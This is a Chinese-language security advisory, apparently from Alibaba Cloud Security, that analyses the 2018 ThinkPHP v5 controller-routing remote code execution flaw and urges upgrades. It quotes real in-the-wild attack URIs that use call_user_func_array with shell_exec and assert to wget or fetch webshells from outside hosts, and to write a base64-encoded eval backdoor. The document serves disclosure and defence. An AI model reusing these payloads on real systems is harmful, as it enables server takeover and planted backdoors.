***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

 **2018年12月10日，ThinkPHP
v5系列发布安全更新，修复了一处可导致远程代码执行的严重漏洞。阿里云态势感知已捕获多起基于该漏洞的真实攻击，并对该漏洞原理以及漏洞利用方式进行分析。此次漏洞由ThinkPHP
v5框架代码问题引起，其覆盖面广，且可直接远程执行任何代码和命令。电子商务行业、金融服务行业、互联网游戏行业等网站使用该ThinkPHP框架比较多，需要格外关注。**

## 概述

由于ThinkPHP
v5框架对控制器名没有进行足够的安全检测，导致在没有开启强制路由的情况下，黑客构造特定的请求，可直接进行远程的代码执行，进而获得服务器权限。

### 漏洞影响的版本

> ThinkPHP v5.0系列 < 5.0.23
>
> ThinkPHP v5.1系列 < 5.1.31

## 漏洞原理分析

通过对比ThinkPHP官方发布的漏洞修复说明，直接分析thinkphp解析路由调度的代码
/thinkphp/library/think/Route.php

![](https://image.3001.net/images/20181212/1544600212_5c10ba9410a35.png!small)

parseUrlPath函数调用path函数并解析了pathinfo中的路由信息，函数中url直接用/切分，没有加任何过滤机制。

搜索pathinfo发现//thinkphp/library/think/Request.php 定义了获取URL的pathionfo函数：

![](https://image.3001.net/images/20181212/1544600256_5c10bac079a24.png!small)

我们可以利用$_GET可控的值来进行命令注入。var_pathinfo的参数为s，所以可以直接构造命令注入的函数。

继续分析路由调度的代码app.php，通过'controller' 来执行控制器操作，实例化控制器，跟进controller方法：

![](https://image.3001.net/images/20181212/1544600275_5c10bad327871.png!small)

//thinkphp/library/think/
Loader.php中，controller调用parseModuleAndClass方法，直接解析$name，实例化$class，当$name匹配
反斜线\时直接将其作为方法和类 strpos($name, '\\\')
，我们可以在这里构造实例化我们想要调用的方法。实例化\namespace\class类并执行call_user_func_array方法。

![](https://image.3001.net/images/20181212/1544600292_5c10bae4eb239.png!small)

![](https://image.3001.net/images/20181212/1544600302_5c10baee2d51a.png!small)

漏洞复现：

我们拿存在ThinkPHP v5远程代码执行漏洞的5.0.22版本进行复现测试。下图是我们在存在该漏洞的主机上执行ls命令，可以拿到目录下的所有文件详情。

![](https://image.3001.net/images/20181212/1544600321_5c10bb0100a95.png!small)

## 漏洞攻击真实案例

截至2018年12月11日，阿里云态势感知监控到的数据显示，黑客们利用该漏洞进行攻击的方式有很多，目前主要是以webshell为主，可能由于曝光PoC时间太短，很多黑产(如挖矿)都还没充分利用。对目前所有的webshell方式总结后，比较流行的有以下几种：

### 1\. 利用该漏洞远程执行下载命令，通过wget远程下载一个webshell后门，执行命令从而获得服务器权限。

其攻击URI详情如下：

    
    
    "/admin.php?s=admin/think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget+-O+help.php+http%3a%2f%2ftzrj.host.smartgslb.com%2fhelp.php.txt "

通过执行wget命令：`wget -O help.php
<http://tzrj.host.smartgslb.com/help.php.txt>`，下载webshell。

下面是该webshell所具有的功能列表，如下图：

![](https://image.3001.net/images/20181212/1544600339_5c10bb1370d9e.png!small)

### 2\. 利用file_get_contents和file_put_contents函数，远程下载webshell。

其攻击的URI详情如下：

    
    
    "/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=file_put_contents('content.php',file_get_contents('<http://jzy1115.host3v.vip>'));"

该webshell所具备的功能详细如下图：

![](https://image.3001.net/images/20181212/1544600354_5c10bb220565c.png!small)

### 3\. 利用file_put_contents函数 写入一句话webshell，其攻击的URI详情如下：

    
    
    "/admin.php?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=file_put_contents('./vendor/autoclass.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWyczNjB2ZXJ5J107ZXZhbCgkcGFzcyk7Pz4='))"

该命令行包含的base64加密字符串解码如下：

    
    
    "<?php $pass=$_POST['360very'];eval($pass);?>"

该恶意代码将被写入到文件./vendor/autoclass.php中。

## 漏洞影响和攻击趋势

通过对网站信息数据的统计，我们发现存在该漏洞的的网站占比约10%左右。而从阿里云态势感知监控到的数据显示，从2018-12-04开始至2018-12-11，被攻击的网站数据暴增。以我们和漏洞利用攻击对抗的经验来看，该漏洞的利用攻击会出现更多变种，各个企业应尽快升级ThinkPHP的代码框架至最新版本，避免自己的网站被攻破，服务器沦陷为肉鸡。

![](https://image.3001.net/images/20181212/1544600380_5c10bb3c3a2a4.png!small)

下面是被攻击网站数量变化趋势，可看出该漏洞被曝光后迅速被大规模自动化利用。

![](https://image.3001.net/images/20181212/1544600395_5c10bb4b51e39.png!small)

漏洞详情：<https://blog.thinkphp.cn/869075>

 ***本文作者：阿里云安全，转载请注明来自FreeBuf.COM**

